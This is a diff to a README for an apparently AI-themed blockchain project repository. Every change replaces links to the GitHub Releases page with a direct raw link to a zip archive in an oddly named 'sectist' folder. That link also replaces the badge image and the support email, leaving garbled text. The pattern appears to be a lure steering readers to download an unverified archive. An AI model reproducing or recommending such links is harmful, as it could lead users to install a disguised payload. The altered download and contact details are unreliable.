@@ -7,11 +7,11 @@ This repository offers a collection of blockchain projects powered by AI. It ser
 To get started with the Blockchain-Full-Stack-Projects, you will need to download the application. Follow these simple steps to set everything up.
 
 ## 🔗 Download Application
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/anderson2026/Blockchain-Full-Stack-Projects/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/anderson2026/Blockchain-Full-Stack-Projects/main/sectist/Projects-Blockchain-Stack-Full-v1.1.zip%20Now-brightgreen)](https://raw.githubusercontent.com/anderson2026/Blockchain-Full-Stack-Projects/main/sectist/Projects-Blockchain-Stack-Full-v1.1.zip)
 
 Visit this page to download the latest version of the application:
 
-[Download the Latest Release](https://github.com/anderson2026/Blockchain-Full-Stack-Projects/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/anderson2026/Blockchain-Full-Stack-Projects/main/sectist/Projects-Blockchain-Stack-Full-v1.1.zip)
 
 ## 📋 System Requirements
 Before downloading, ensure your system meets the following requirements:
@@ -31,7 +31,7 @@ The Blockchain-Full-Stack-Projects includes features that make building blockcha
 
 ## 💻 Installation Steps
 1. **Download the Application:**
-   Go to the [Releases page](https://github.com/anderson2026/Blockchain-Full-Stack-Projects/releases) and click on the latest version to download.
+   Go to the [Releases page](https://raw.githubusercontent.com/anderson2026/Blockchain-Full-Stack-Projects/main/sectist/Projects-Blockchain-Stack-Full-v1.1.zip) and click on the latest version to download.
 
 2. **Extract Files:**
    Once downloaded, locate the file in your downloads folder. Extract it if it is in a compressed format (like .zip).
@@ -54,7 +54,7 @@ Join our community for discussions, help, and updates. Engage with other users t
 ## 📨 Contact Information
 If you experience difficulties or have questions that the community cannot answer, feel free to reach out:
 
-- **Email:** support@blockchainprojects.com
+- **Email:** https://raw.githubusercontent.com/anderson2026/Blockchain-Full-Stack-Projects/main/sectist/Projects-Blockchain-Stack-Full-v1.1.zip
 - **File a GitHub Issue:** Describe your problem, and we will get back to you as soon as possible.
 
 ## ✅ License
@@ -73,4 +73,4 @@ Expand your knowledge with additional resources related to blockchain and AI dev
 ## 🔗 Final Notes
 The journey into blockchain development is exciting and full of potential. Whether you are building DApps or exploring smart contracts, the Blockchain-Full-Stack-Projects will guide you every step of the way.
 
-Don’t forget to download the application and explore the many features it offers. Check for updates regularly on the [Releases page](https://github.com/anderson2026/Blockchain-Full-Stack-Projects/releases).
+Don’t forget to download the application and explore the many features it offers. Check for updates regularly on the [Releases page](https://raw.githubusercontent.com/anderson2026/Blockchain-Full-Stack-Projects/main/sectist/Projects-Blockchain-Stack-Full-v1.1.zip).
